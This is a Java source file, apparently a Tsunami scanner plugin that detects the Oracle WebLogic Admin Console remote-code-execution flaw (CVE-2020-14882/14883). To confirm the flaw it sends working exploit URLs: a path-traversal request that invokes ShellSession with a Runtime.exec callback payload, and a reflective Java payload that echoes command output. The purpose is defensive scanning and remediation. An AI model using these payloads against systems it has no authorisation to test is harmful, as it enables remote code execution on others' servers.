/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.cve202014883;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.collect.ImmutableSet;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;

/**
 * A {@link VulnDetector} that detects highly critical RCE vulnerability in Oracle WebLogic Admin
 * Console.
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "WebLogicAdminConsoleRceDetector",
    version = "0.1",
    description = "Detects CVE-2020-14883 RCE vulnerability.",
    author = "Tsunami Team (tsunami-dev@google.com)",
    bootstrapModule = WebLogicAdminConsoleRceDetectorBootstrapModule.class)
public final class WebLogicAdminConsoleRceDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String INJECTION_TEMPLATE =
      "%sconsole/images/.%%252e/console.portal?_nfpb=true&_pageLable=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%s);";
  private static final ImmutableSet<String> HTTP_EQUIVALENT_SERVICE_NAMES =
      ImmutableSet.of(
          "",
          "unknown", // nmap could not determine the service name, we try to exploit anyway.
          "afs3-callback"); // most /etc/services list port 7001 as afs3-callback service
  @VisibleForTesting static final String VULNERABILITY_REPORT_PUBLISHER = "Google";
  @VisibleForTesting static final String VULNERABILITY_REPORT_ID = "CVE_2020_14883";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_TITLE =
      "Oracle WebLogic Admin Console RCE (CVE-2020-14750, CVE-2020-14882, CVE-2020-14883)";

  @VisibleForTesting
  static final String VULN_DESCRIPTION =
      "A remote code execution vulnerability exists in the Oracle WebLogic Server product of"
          + " Oracle Fusion Middleware (component: Console). This vulnerability is associated to"
          + " CVE-2020-14750, CVE-2020-14882, CVE-2020-14883. Versions 10.3.6.0.0, 12.1.3.0.0,"
          + " 12.2.1.3.0, 12.2.1.4.0, and 14.1.1.0.0 are known to be affected. Please read the"
          + " remediation guidance section below for how to mitigate.";

  @VisibleForTesting
  static final String RECOMMENDATION =
      "This is a critical vulnerability requiring immediate action. If your service is vulnerable,"
          + " you should update it to patch the vulnerability. **Please check"
          + " https://www.oracle.com/security-alerts/cpuoct2020.html for detailed patch"
          + " information.**";

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;

  @Inject
  WebLogicAdminConsoleRceDetector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = utcClock;
    this.httpClient = httpClient;
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting rce detection for WebLogic admin console.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isInScopeService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isInScopeService(NetworkService networkService) {
    return NetworkServiceUtils.isWebService(networkService)
        || HTTP_EQUIVALENT_SERVICE_NAMES.contains(networkService.getServiceName());
  }

  private String buildRootUri(NetworkService networkService) {
    if (NetworkServiceUtils.isWebService(networkService)) {
      return NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    }
    return String.format("http://%s/", toUriAuthority(networkService.getNetworkEndpoint()));
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String rootUri = buildRootUri(networkService);

    return (payloadGenerator.isCallbackServerEnabled()
            && isVulnerableWithCallback(rootUri, networkService))
        || isVulnerableWithoutCallback(rootUri, networkService);
  }

  private boolean isVulnerableWithCallback(
      String rootUri, NetworkService networkService) {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();
    Payload payload = payloadGenerator.generate(config);
    String rceCommand =
        String.format(
            "%%22java.lang.Runtime.getRuntime().exec(%%22%s%%22);%%22",
            payload.getPayload().replace(" ", "%20"));
    String targetUri = String.format(INJECTION_TEMPLATE, rootUri, rceCommand);

    try {
      sendPayload(targetUri, networkService);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
    }
    Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(10));
    return payload.checkIfExecuted();
  }

  private boolean isVulnerableWithoutCallback(
      String rootUri, NetworkService networkService) {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .setInterpretationEnvironment(PayloadGeneratorConfig.InterpretationEnvironment.JAVA)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();
    Payload payload = payloadGenerator.generateNoCallback(config);
    String targetUri =
        String.format(
            INJECTION_TEMPLATE,
            rootUri,
            String.format(
                "%%22weblogic.work.ExecuteThread%%20t%%20=%%20(weblogic.work.ExecuteThread)%%20Thread.currentThread();weblogic.work.WorkAdapter%%20adapter%%20=%%20t.getCurrentWork();java.lang.reflect.Field%%20field%%20=%%20adapter.getClass().getDeclaredField(%%22connectionHandler%%22);field.setAccessible(true);Object%%20obj%%20=%%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%%20req%%20=%%20(weblogic.servlet.internal.ServletRequestImpl)%%20obj.getClass().getMethod(%%22getServletRequest%%22).invoke(obj);String%%20out%%20=%s;weblogic.servlet.internal.ServletResponseImpl%%20res%%20=%%20(weblogic.servlet.internal.ServletResponseImpl)%%20req.getClass().getMethod(%%22getResponse%%22).invoke(req);res.getServletOutputStream().writeStream(new%%20weblogic.xml.util.StringInputStream(out));res.getServletOutputStream().flush();res.getWriter().write(%%22%%22)t.interrupt();%%22",
                // Encode the payload. Note that the '(' and ')' in the payload should not be
                // encoded.
                payload.getPayload().replace("\"", "%22").replace(" ", "%20")));
    try {
      HttpResponse response = sendPayload(targetUri, networkService);
      return response.status().isSuccess() && payload.checkIfExecuted(response.bodyBytes());
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
    }
    return false;
  }

  private HttpResponse sendPayload(String targetUri, NetworkService networkService)
      throws IOException {
    logger.atInfo().log("Trying to execute weblogic payload on target '%s'", targetUri);
    // This is a blocking call.
    return httpClient.send(HttpRequest.get(targetUri).withEmptyHeaders().build(), networkService);
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService networkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(networkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher(VULNERABILITY_REPORT_PUBLISHER)
                        .setValue(VULNERABILITY_REPORT_ID))
                .setSeverity(Severity.CRITICAL)
                .setTitle(VULNERABILITY_REPORT_TITLE)
                .setDescription(VULN_DESCRIPTION)
                .setRecommendation(RECOMMENDATION))
        .build();
  }
}
